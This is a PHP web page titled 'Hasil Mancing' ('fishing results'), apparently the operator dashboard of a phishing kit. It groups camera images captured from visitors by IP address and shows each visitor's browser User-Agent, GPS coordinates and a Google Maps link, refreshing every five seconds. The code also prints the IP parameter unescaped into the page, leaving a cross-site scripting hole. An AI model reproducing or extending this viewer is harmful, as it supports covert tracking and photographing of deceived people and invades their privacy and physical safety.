<?php
$UPLOAD_DIR = __DIR__ . "/hasil";
$LOC_FILE = $UPLOAD_DIR . "/location.txt";

$ipParam = $_GET['ip'] ?? '';
$perPage = 10;

// Ambil semua gambar
$allImages = glob($UPLOAD_DIR . "/*.{jpg,jpeg,png,gif,webp}", GLOB_BRACE);
rsort($allImages);

// Ambil lokasi + User-Agent terakhir per IP
$locations = [];
$userAgents = [];
$latlon = [];
if(file_exists($LOC_FILE)){
    $lines = file($LOC_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach($lines as $line){
        if(preg_match('/IP: ([\d\.:a-fA-F\-]+)/', $line,$m)){
            $ip = $m[1];
            $locations[$ip] = $line;

            if(preg_match('/User-Agent: (.+)$/', $line,$ua)) $userAgents[$ip] = $ua[1];

            if(preg_match('/Lat: ([\-\d\.]+)/',$line,$latm) && preg_match('/Lon: ([\-\d\.]+)/',$line,$lonm)){
                $latlon[$ip] = ['lat'=>$latm[1],'lon'=>$lonm[1]];
            }
        }
    }
}

// Handle delete request
if(isset($_POST['delete_ip'])){
    $delIP = $_POST['delete_ip'];
    foreach($allImages as $file){
        if(str_starts_with(basename($file), $delIP.'_')){
            @unlink($file);
        }
    }
    if(file_exists($LOC_FILE)){
        $lines = file($LOC_FILE, FILE_IGNORE_NEW_LINES);
        $lines = array_filter($lines, fn($line)=>!str_contains($line,"IP: $delIP"));
        file_put_contents($LOC_FILE, implode(PHP_EOL,$lines));
    }
    header("Location: viewer.php");
    exit;
}

// Grupkan gambar per IP

// Grupkan gambar per IP
$grouped = [];
foreach($allImages as $img){
    $filename = basename($img);
    if(preg_match('/^([0-9a-fA-F\-]+)_\d+\.(jpg|jpeg|png|gif|webp)$/i', $filename, $m)){
        $grouped[$m[1]][] = $img;
    }
}

// Tambahkan IP yang punya lokasi meski belum ada gambar
foreach($latlon as $ip => $coord){
    if(!isset($grouped[$ip])){
        $grouped[$ip] = []; // biar tetap tampil di menu
    }
}



// Jika ada IP param, tampilkan gambar IP itu saja
if($ipParam){
    $imagesAll = $grouped[$ipParam] ?? [];
    $totalImages = count($imagesAll);
    $totalPages = ceil($totalImages / $perPage);
    $page = isset($_GET['page']) ? max(1,intval($_GET['page'])) : 1;
    $page = max(1, min($page, $totalPages));
    $startIdx = ($page-1) * $perPage;
    $images = array_slice($imagesAll, $startIdx, $perPage);
}
?>
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Hasil Mancing</title>
<style>
body{margin:0;padding:16px;font-family:sans-serif;background:#0f172a;color:#fff;}
h1{text-align:center;margin-bottom:8px;}
#reloadTimer{ text-align:center;margin-bottom:12px;color:#facc15;font-weight:bold; }
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:16px;}
.card{position:relative;background:rgba(255,255,255,0.05);backdrop-filter:blur(12px);border-radius:16px;padding:8px;display:flex;flex-direction:column;align-items:center;transition:transform 0.3s,box-shadow 0.3s;}
.card:hover{transform:scale(1.05);box-shadow:0 8px 20px rgba(0,0,0,0.5);}
.card img{width:100%;height:150px;object-fit:cover;border-radius:12px;cursor:pointer;}
.ip-name{text-align:center;font-weight:bold;margin:4px 0;}
.user-agent{text-align:center;font-size:0.8em;color:#aaa;margin-bottom:2px;}
.latlon{text-align:center;font-size:0.8em;color:#bbb;margin-bottom:4px;}
.img-count{text-align:center;font-size:0.9em;color:#fff;margin-bottom:4px;}
.btn-container{display:flex;justify-content:center;gap:8px;margin-top:8px;}
.btn-container button{padding:6px 10px;border:none;border-radius:10px;background:#2563eb;color:#fff;cursor:pointer;transition:transform 0.2s, background 0.3s;}
.btn-container button:hover{background:#3b82f6;transform:scale(1.05);}
.btn-delete{background:#dc2626;}
.btn-delete:hover{background:#f87171;}
.back-btn{display:inline-block;margin-top:12px;padding:6px 12px;background:#2563eb;color:#fff;border-radius:8px;text-decoration:none;transition:background 0.3s;}
.back-btn:hover{background:#3b82f6;}
.pagination{display:flex;justify-content:center;gap:12px;margin-top:12px;}
.pagination a{padding:6px 12px;background:#2563eb;color:#fff;border-radius:8px;text-decoration:none;transition:background 0.3s;}
.pagination a:hover{background:#3b82f6;}

/* Lightbox */
#lightbox{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);justify-content:center;align-items:center;z-index:999;}
#lightbox img{max-width:90%;max-height:90%;border-radius:16px;}
#lightbox span{position:absolute;top:16px;right:16px;color:#fff;font-size:2em;cursor:pointer;}


</style>


<style>
.user-agent {
    min-height: 5em;     /* tinggi minimal setara 5 baris */
    line-height: 1em;    /* tinggi per baris */
    white-space: normal; /* biar teks panjang bisa wrap */
    overflow-wrap: break-word;
}
</style>

</head>
<body>
<h1 id="pageTitle">📸 Hasil Mancing</h1>

<?php if(!$ipParam): ?>
<div id="reloadTimer">Halaman akan otomatis reload dalam <span id="countdown">5</span> detik</div>
<div class="grid">
<?php foreach($grouped as $ip=>$imgs): ?>
<div class="card">
    <div class="ip-name" title="<?=str_replace('-', ':', $ip)?>">
    <?=substr(str_replace('-', ':', $ip), 0, 18)?>
</div>
<div class="user-agent">
    <?= !empty($userAgents[$ip]) ? htmlspecialchars($userAgents[$ip]) : '<i>Unknown</i>'?>

</div>

    <div class="img-count"><?=count($imgs)?> gambar</div>
    <a href="?ip=<?=$ip?>">
    <?php if(!empty($imgs)): ?>
        <img src="<?=htmlspecialchars('hasil/'.basename($imgs[0]))?>" alt="Thumb">
    <?php else: ?>
        <div style="width:100%;height:150px;display:flex;align-items:center;justify-content:center;background:#334155;border-radius:12px;color:#aaa;">
            no image
        </div>
    <?php endif; ?>
</a>
    <div class="btn-container">
        <?php if(isset($latlon[$ip]) && $latlon[$ip]['lat'] && $latlon[$ip]['lon']): ?>
        <button onclick="window.open('https://www.google.com/maps?q=<?=$latlon[$ip]['lat']?>,<?=$latlon[$ip]['lon']?>','_blank')">Lokasi</button>
        <?php endif; ?>
        <form method="post" onsubmit="return confirm('Hapus semua gambar IP <?=$ip?>?');">
            <input type="hidden" name="delete_ip" value="<?=$ip?>">
            <button type="submit" class="btn-delete">Hapus</button>
        </form>
    </div>
</div>
<?php endforeach; ?>
</div>

<script>
// Countdown & reload halaman
let seconds = 5;
const countdownEl = document.getElementById('countdown');
const interval = setInterval(() => {
    seconds--;
    if(seconds <= 0){
        clearInterval(interval);
        location.reload();
    } else {
        countdownEl.textContent = seconds;
    }
}, 1000);
</script>

<?php else: ?>
<div class="grid">
<?php foreach($images as $img):
    $filename = basename($img);
    $timestamp = '';
    if(preg_match('/\d+_(\d+)\./', $filename,$m)){
        $timestamp = date('Y-m-d H:i:s',$m[1]);
    }
?>
<div class="card">
    <img src="<?=htmlspecialchars('hasil/'.$filename)?>" alt="" onclick="openLightbox('<?=htmlspecialchars('hasil/'.$filename)?>')">
    <div class="timestamp"><?=$timestamp?></div>
</div>
<?php endforeach; ?>
</div>

<div class="pagination">
<?php if($page>1): ?><a href="?ip=<?=$ipParam?>&page=<?=$page-1?>">← Previous</a><?php endif; ?>
<?php if($page<$totalPages): ?><a href="?ip=<?=$ipParam?>&page=<?=$page+1?>">Next →</a><?php endif; ?>
</div>

<a href="viewer.php" class="back-btn">← Kembali</a>

<script>
// Ganti judul halaman menjadi IP saat berada di halaman per IP
document.getElementById('pageTitle').textContent = "📸 <?=$ipParam?>";
</script>

<?php endif; ?>

<!-- Lightbox -->
<div id="lightbox" onclick="closeLightbox()">
    <span onclick="event.stopPropagation(); closeLightbox()">×</span>
    <img id="lightboxImg" src="">
</div>

<script>
function openLightbox(src){
    document.getElementById('lightboxImg').src = src;
    document.getElementById('lightbox').style.display = 'flex';
}
function closeLightbox(){
    document.getElementById('lightbox').style.display = 'none';
}
</script>
</body>
</html>